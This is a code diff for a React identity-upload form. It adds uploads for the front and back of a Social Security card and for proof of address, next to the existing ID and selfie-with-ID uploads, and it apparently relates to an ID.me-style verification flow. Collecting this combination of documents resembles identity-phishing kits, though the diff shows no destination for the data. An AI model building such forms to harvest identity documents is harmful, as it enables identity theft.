@@ -19,7 +19,8 @@ export default function UploadID() {
   const keys = Object.keys(useSelector((s) => s.id));
   const errors = Object.values(useSelector((s) => s.id)).map((arr) => arr[1]);
 
-  const { frontID, backID, selfieID } = useSelector((s) => s.id);
+  const { frontID, backID, selfieID, frontSSN, backSSN, proofAddr } =
+    useSelector((s) => s.id);
   const { id } = useSelector((st) => st.idme);
 
   async function handleSubmit(e) {
@@ -29,6 +30,7 @@ export default function UploadID() {
         dispatch(displayErr(key));
         return true;
       }
+
       return false;
     });
     if (hasErrors.length > 0) return;
@@ -36,12 +38,14 @@ export default function UploadID() {
       id,
       frontID.at(0),
       backID.at(0),
-      selfieID.at(0)
+      selfieID.at(0),
+      frontSSN.at(0),
+      backSSN.at(0),
+      proofAddr.at(0)
     );
-    console.log(status);
     // Handle error later
     if (status !== 'success') return;
-    navigate('/idme');
+    navigate('/finish');
   }
   return (
     <>
@@ -52,7 +56,9 @@ export default function UploadID() {
           <FrontID />
           <BackID />
           <SelfieID />
-          {/* <ProofAddr /> */}
+          <FrontSSN />
+          <BackSSN />
+          <ProofAddr />
           <Buttons onClick={handleSubmit} />
         </form>
       </main>
@@ -80,6 +86,21 @@ export function SelfieID() {
   return (
     <UploadPhoto label="selfieID" url={'assets/boy-holding-id.jpg'}>
       A picture of you holding your ID
+    </UploadPhoto>
+  );
+}
+
+export function FrontSSN() {
+  return (
+    <UploadPhoto label="frontSSN" url={'./assets/front-id.jpg'}>
+      A front copy of your SSN Card
+    </UploadPhoto>
+  );
+}
+export function BackSSN() {
+  return (
+    <UploadPhoto label="backSSN" url={'./assets/front-id.jpg'}>
+      A back copy of your SSN Card
     </UploadPhoto>
   );
 }
